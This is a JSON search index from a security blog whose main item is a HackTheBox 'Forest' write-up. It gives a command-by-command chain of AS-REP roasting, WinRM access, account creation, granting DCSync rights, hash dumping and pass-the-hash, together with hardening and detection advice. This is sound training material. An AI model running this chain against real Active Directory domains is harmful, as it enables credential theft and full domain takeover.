[{"content":"","date":"25 dezembro 2025","externalUrl":null,"permalink":"/categories/ctf-hackthebox/","section":"Categories","summary":"","title":"[\"CTF\", \"HackTheBox\"]","type":"categories"},{"content":"","date":"25 dezembro 2025","externalUrl":null,"permalink":"/series/hackthebox-easy/","section":"Series","summary":"","title":"[\"HackTheBox Easy\"]","type":"series"},{"content":" Machine Information # Property Value Plataform HackTheBox Difficult Easy Operation System Windows IP 10.129.45.7 Executive Summary # In this write-up, I demonstrate the full compromise of the Forest machine from Hack The Box, an Active Directory environment rated as Easy. The attack starts with network enumeration, where an LDAP misconfiguration allows anonymous access and exposes valid domain users, enabling an AS-REP Roasting attack. With the recovered credentials, I gain an initial foothold in the domain and continue enumerating the environment. A domain misconfiguration allows the compromised account to perform a DCSync attack, leading to the extraction of domain hashes and full Domain Administrator compromise. This machine demonstrates how common Active Directory misconfigurations, combined with insufficient hardening, can result in a complete domain compromise.\nRecon # As always, we start with recon, port scan. I used nmap to scan the default ports (top 1000 most common):\nsudo nmap -Pn -sS -sVC -O -T4 10.129.45.7 -oN nmap_forest Open Ports # I use enum4linux with -a parameter for try get more info about the target\nenum4linux -a 10.129.45.7 The most important information obtained from enum4linux was the user enumeration. We could extract this information manually with the following sequence of commands:\nrpcclient -U \u0026#34;\u0026#34; -N \u0026lt;target_IP\u0026gt; We found a non-common user: a service user (In CTF\u0026rsquo;s and certification exams, - Any non-standard service or program installed on the machine is suspicious and was likely placed there intentionally - .\nThe account svc-alfresco is a service account ; researching, alfresco is a \u0026lsquo;software\u0026rsquo; for manage process in enterprises - for run this service is necessary disable kerberos authentication.\nOther way is explore the LDAP. We found various ports but LDAP here is very interesting.\nwe use:\nldapsearch -x -H ldap://\u0026lt;IP_TARGET\u0026gt;:389 -b \u0026#34;dc=htb,dc=local\u0026#34; For filtering i use grep for show us the relevant info. We could used\nldapsearch -x -H ldap://\u0026lt;TARGET_IP\u0026gt;:389 -b dc=htb,dc=local\u0026#34; | grep -e \u0026#34;Accounts\u0026#34; ldapsearch -x -H ldap://\u0026lt;TARGET_IP\u0026gt;:389 -b dc=htb,dc=local\u0026#34; | grep -e \u0026#34;Groups\u0026#34; ldapsearch -x -H ldap://\u0026lt;TARGET_IP\u0026gt;:389 -b dc=htb,dc=local\u0026#34; | grep -e \u0026#34;#\u0026#34; At this point, I was looking for something I already knew existed\nExist a non-common service in this forest\nWe can use the windapsearch tool for more recon, but at this point, is the same info that we have\ngithub.com/ropnop/windapsearch\n./windapsearch.py -d \u0026lt;domain\u0026gt; --dc-ip \u0026lt;target_IP\u0026gt; -U use windapsearch.py -h for understand the parameters used here or possible to use in future;\n./windapsearch.py -d \u0026lt;domain\u0026gt; --dc-ip \u0026lt;target_IP\u0026gt; --custom \u0026#34;objectClass=*\u0026#34; Installing the requisites\nLet\u0026rsquo;s go try a initial access\nFoothold # The GetNPUsers.py script from Impacket can request a TGT ticket and dump the hash If you need, install the impacket with:\nsudo apt install python3-impacket impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.45.7 -no-pass Then, we catch the hash and save in .txt mode with a text editor; I like vim or nvim;\nThe password is s3rvice; the port 5985, default por of winRM is open (nmap port scan); let\u0026rsquo;s try to connect:\nevil-winrm -i 10.129.45.7 -u svc-alfresco -p s3rvice At this point, we have the first flag of this machine; 1/2;\nLet\u0026rsquo;s go try to transform ths in Administrator acces\nPrivilege Escalation # At this point, I decided to take a dual approach: use BloodHound for the first time to learn the tool, while also continuing with manual enumeration, which was my original methodology. I found an excellent video on BloodHound setup that may be helpful, available at the link below: https://www.youtube.com/watch?v=NFfHUYAyGN8\nwe need to specif version on github.com/SpecterOps/BloodHound-Legacy/tree/master\ngit clone github.com/SpecterOps/BloodHound-Legacy.git Basically, the svc-alfresco account was member of group \u0026ldquo;service accounts@htb.local\u0026rdquo; and this group, was member of group \u0026ldquo;privileged it accounts@htb.local\u0026rdquo;. Because of this nested group configuration, \u0026lsquo;Service Accounts\u0026rsquo; inherited the privileges of \u0026lsquo;Privileged IT Accounts\u0026rsquo;, which meant it could create and modify user accounts\nThe following screenshots demonstrate manual enumeration without BloodHound to identify the nested group structure mentioned above\nGet-ADUSer svc-alfresco -Properties MemberOf | Select-Object -ExpandProperty MemberOf Get-AdGroup \u0026#34;Service Accounts\u0026#34; -Properties MemberOf | Select-Object -ExpandProperty MemberOf And the Group \u0026ldquo;Privileged IT Accounts\u0026rdquo; is member of \u0026ldquo;Account Operators\u0026rdquo;. We prove this with:\nGet-ADGroup \u0026#34;Privileged IT Accounts\u0026#34; -Properties MemberOf | Select-Object -ExpandProperty MemberOf Now, we need investigate: what this group can do? The Microsoft Documentation is the best local for this\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators\nResearch quickly reveals the steps to create a user and grant the necessary permissions for DCSync\nnet user hacker P@ssword1 /add /domain net group \u0026#34;Exchange Windows Permissions\u0026#34; hacker /add net localgroup \u0026#34;Remote Management Users\u0026#34; hacker /add $pass = convertio-securestring \u0026#39;P@ssword1\u0026#39; -asplain -force $cred = new-object system.management.automation.pscredential(\u0026#39;htb\\hacker\u0026#39;,$pass) Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync #this is the key for this attack Now, the dcsync attack is possible! We can see NTLM hashes In my kali linux:\nimpacket-secretsdump htb/hacker@10.129.45.7 impacket-psexec administrator@10.129.45.7 -hashes \u0026lt;hash_adm\u0026gt; Access to Administrator account and catch the flag\nLessons Learned # This machine provided valuable insights into Active Directory enumeration and privilege escalation through nested group memberships.\nAnonymous LDAP/RPC Access # The ability to enumerate users without credentials was the initial foothold. Using enum4linux -a and rpcclient, we could extract the complete list of domain users without authentication.\nThis is a critical misconfiguration that still exists in many environments. Organizations should disable anonymous binds on LDAP and configure the RestrictAnonymous registry key to value 2.\nAS-REP Roasting # The svc-alfresco account had the DONT_REQ_PREAUTH flag set, allowing us to obtain its TGT hash without authentication using GetNPUsers.py. The hash was easily cracked with hashcat, revealing the password s3rvice.\nService accounts are prime targets for this attack when Kerberos pre-authentication is disabled.\nNested Group Memberships # The privilege escalation path was not immediately obvious. The svc-alfresco user was member of Service Accounts, which was member of Privileged IT Accounts, which was member of Account Operators.\nsvc-alfresco (user) ‚îî‚îÄ\u0026gt; Service Accounts (group) ‚îî‚îÄ\u0026gt; Privileged IT Accounts (nested group) ‚îî‚îÄ\u0026gt; Account Operators (privileged built-in group) BloodHound visualizes these relationships automatically, but understanding manual enumeration is crucial for exams and restricted environments.\nWe could extract this information manually with the following sequence of commands:\nGet-ADUser svc-alfresco -Properties MemberOf | Select-Object -ExpandProperty MemberOf Get-ADGroup \u0026#34;Service Accounts\u0026#34; -Properties MemberOf | Select-Object -ExpandProperty MemberOf Get-ADGroup \u0026#34;Privileged IT Accounts\u0026#34; -Properties MemberOf | Select-Object -ExpandProperty MemberOf Account Operators Group # The Account Operators group is often overlooked but provides significant privileges - create and modify user accounts, modify group memberships (with some exceptions), and reset passwords for non-protected accounts.\nCombined with knowledge of DCSync requirements, this group can lead directly to Domain Admin compromise.\nDCSync Attack # The DCSync attack requires specific permissions on the domain object - DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.\nThe attack chain was:\nnet user hacker P@ssword1 /add /domain net group \u0026#34;Exchange Windows Permissions\u0026#34; hacker /add net localgroup \u0026#34;Remote Management Users\u0026#34; hacker /add $pass = ConvertTo-SecureString \u0026#39;P@ssword1\u0026#39; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(\u0026#39;htb\\hacker\u0026#39;,$pass) Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync Then, in my kali linux:\nimpacket-secretsdump htb/hacker@10.129.45.7 Detection: Monitor Event ID 4662 for replication operations from non-DC computers.\nManual vs Automated Enumeration # At this point, I decided to take a dual approach: use BloodHound for the first time to learn the tool, while also continuing with manual enumeration, which was my original methodology.\nWhile BloodHound is powerful for visualizing attack paths, understanding manual enumeration is critical - certification exams (OSCP, CRTP) may restrict automated tools, manual commands can be less noisy, and when tools fail, manual methods still work.\nExchange Windows Permissions # Adding the user to Exchange Windows Permissions was crucial for the privilege escalation. This group often has WriteDacl permissions on the domain object, which can be leveraged for DCSync.\nThis was a common misconfiguration in Exchange-integrated AD environments.\nTool Proficiency # This machine reinforced the importance of mastering the Impacket suite:\nGetNPUsers.py for AS-REP Roasting secretsdump.py for DCSync and hash dumping psexec.py for remote code execution with Pass-the-Hash WinRM Access # Port 5985 (WinRM) provided a PowerShell-based shell using evil-winrm. This is increasingly common in Windows environments and provides more stable access than traditional reverse shells.\nMethodology # Following a structured approach:\nReconnaissance - Port scanning, service identification Enumeration - User discovery, LDAP queries, RPC enumeration Initial Access - AS-REP Roasting Privilege Escalation - Nested group discovery, Account Operators, DCSync Post-Exploitation - Administrator access, flag capture ","date":"25 dezembro 2025","externalUrl":null,"permalink":"/writeups/forest/","section":"Write-ups","summary":" Machine Information # Property Value Plataform HackTheBox Difficult Easy Operation System Windows IP 10.129.45.7 Executive Summary # In this write-up, I demonstrate the full compromise of the Forest machine from Hack The Box, an Active Directory environment rated as Easy. The attack starts with network enumeration, where an LDAP misconfiguration allows anonymous access and exposes valid domain users, enabling an AS-REP Roasting attack. With the recovered credentials, I gain an initial foothold in the domain and continue enumerating the environment. A domain misconfiguration allows the compromised account to perform a DCSync attack, leading to the extraction of domain hashes and full Domain Administrator compromise. This machine demonstrates how common Active Directory misconfigurations, combined with insufficient hardening, can result in a complete domain compromise.\n","title":"HackTheBox - Forest","type":"writeups"},{"content":"Aqui voc√™ encontra write-ups detalhados de CTFs, desafios de hacking, an√°lises de vulnerabilidades e muito mais.\nExplore por categoria ou use a busca para encontrar conte√∫do espec√≠fico!\n","date":"25 dezembro 2025","externalUrl":null,"permalink":"/writeups/","section":"Write-ups","summary":"Aqui voc√™ encontra write-ups detalhados de CTFs, desafios de hacking, an√°lises de vulnerabilidades e muito mais.\nExplore por categoria ou use a busca para encontrar conte√∫do espec√≠fico!\n","title":"Write-ups","type":"writeups"},{"content":" üëã Ol√°! # Bem-vindo ao meu blog de write-ups e seguran√ßa da informa√ß√£o!\nSou Lucas Felz, um entusiasta de cybersecurity apaixonado por CTFs, pentesting e hacking √©tico.\nüéØ Foco # CTF Write-ups: HackTheBox, TryHackMe, CTFtime Web Security: OWASP Top 10, bug bounty Binary Exploitation: Buffer overflow, ROP chains Reverse Engineering: An√°lise de malware e engenharia reversa Forensics: An√°lise forense digital üõ†Ô∏è Ferramentas Favoritas # Reconhecimento: nmap, masscan, rustscan Web: Burp Suite, OWASP ZAP, sqlmap Explora√ß√£o: Metasploit, exploit-db Post-Exploitation: LinPEAS, WinPEAS, PowerSploit Reversing: Ghidra, IDA Pro, radare2 üèÜ Conquistas # HackTheBox: Rank Pro Hacker TryHackMe: Top 5% CTFs participados: 50+ Vulnerabilidades reportadas: 10+ üì´ Contato # Email: lucasfelz@gmail.com GitHub: @lucasfelz \u0026ldquo;Hack the planet, but do it ethically!\u0026rdquo; üîê\n","date":"20 dezembro 2025","externalUrl":null,"permalink":"/about/","section":"","summary":"üëã Ol√°! # Bem-vindo ao meu blog de write-ups e seguran√ßa da informa√ß√£o!\nSou Lucas Felz, um entusiasta de cybersecurity apaixonado por CTFs, pentesting e hacking √©tico.\n","title":"Sobre Mim","type":"page"},{"content":"","externalUrl":null,"permalink":"/pt-br/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/pt-br/","section":"Blowfish","summary":"","title":"Blowfish","type":"page"},{"content":"","externalUrl":null,"permalink":"/pt-br/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"Artigos sobre t√©cnicas de hacking, ferramentas, metodologias e experi√™ncias no mundo da seguran√ßa da informa√ß√£o.\n","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"Artigos sobre t√©cnicas de hacking, ferramentas, metodologias e experi√™ncias no mundo da seguran√ßa da informa√ß√£o.\n","title":"Posts","type":"posts"},{"content":"","externalUrl":null,"permalink":"/pt-br/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/pt-br/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]